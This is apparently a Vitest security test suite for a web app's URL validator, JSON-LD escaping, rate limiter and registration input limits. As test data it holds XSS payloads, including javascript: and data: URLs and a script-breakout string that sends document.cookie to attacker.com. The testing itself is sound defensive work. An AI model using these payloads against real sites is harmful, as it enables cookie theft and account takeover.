import { describe, it, expect, beforeEach } from "vitest";
import { isValidSafeUrl, safeJsonLdStringify, validateRegisterInput } from "./validation";
import { MemoryRateLimiter, getClientIp } from "./rate-limit";

describe("Security Hardening & Threat Defense Suite", () => {
  describe("Anti-XSS & Safe URL Validation", () => {
    it("blocks javascript: schemes with mixed casing and whitespace", () => {
      const maliciousUrls = [
        "javascript:alert('pwned')",
        "JAVASCRIPT:alert(1)",
        "javascript :alert(1)",
        " java\tscript:alert(1)",
        "vbscript:alert(1)",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "data:image/svg+xml;utf8,<svg onload=alert(1)>",
        "data:application/x-javascript;alert(1)",
      ];

      for (const url of maliciousUrls) {
        expect(isValidSafeUrl(url)).toBe(false);
      }
    });

    it("permits verified safe URLs and image data URLs", () => {
      const safeUrls = [
        "https://cdn.worldtradinglab.edu.vn/receipts/rec-01.png",
        "http://localhost:3000/images/proof.jpg",
        "/images/default-avatar.png",
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==",
      ];

      for (const url of safeUrls) {
        expect(isValidSafeUrl(url)).toBe(true);
      }
    });
  });

  describe("JSON-LD Script Breakout Protection", () => {
    it("escapes closing script tags to neutralize stored XSS in structured data", () => {
      const payload = {
        name: "</script><script>window.location='https://attacker.com/steal?cookie='+document.cookie</script>",
        description: "Course for <elite> traders & investors",
      };

      const sanitized = safeJsonLdStringify(payload);
      expect(sanitized).not.toContain("</script>");
      expect(sanitized).toContain("\\u003c/script\\u003e");
      expect(sanitized).toContain("\\u003cscript\\u003e");
      expect(sanitized).toContain("\\u0026");
    });
  });

  describe("Rate Limiting Protection against Brute-Force & Flood", () => {
    let limiter: MemoryRateLimiter;

    beforeEach(() => {
      limiter = new MemoryRateLimiter({
        windowMs: 60 * 1000,
        maxRequests: 5,
      });
    });

    it("allows up to maxRequests and blocks subsequent attempts with 429 semantics", () => {
      for (let i = 0; i < 5; i++) {
        const res = limiter.check("attacker-ip");
        expect(res.allowed).toBe(true);
      }

      const blockedRes = limiter.check("attacker-ip");
      expect(blockedRes.allowed).toBe(false);
      expect(blockedRes.remaining).toBe(0);
      expect(blockedRes.resetTime).toBeGreaterThan(Date.now());
    });
  });

  describe("Registration Input Hardening against Bcrypt DoS", () => {
    it("rejects password exceeding 128 characters to protect server CPU from bcrypt DoS", () => {
      const hugePassword = "a".repeat(2000);
      const res = validateRegisterInput({
        name: "Normal User",
        email: "user@example.com",
        password: hugePassword,
      });

      expect(res.isValid).toBe(false);
      expect(res.error).toContain("Password cannot exceed 128 characters");
    });

    it("rejects oversized name payloads", () => {
      const hugeName = "A".repeat(150);
      const res = validateRegisterInput({
        name: hugeName,
        email: "user@example.com",
        password: "securePassword123",
      });

      expect(res.isValid).toBe(false);
      expect(res.error).toContain("Full name must be between 2 and 100 characters");
    });
  });
});
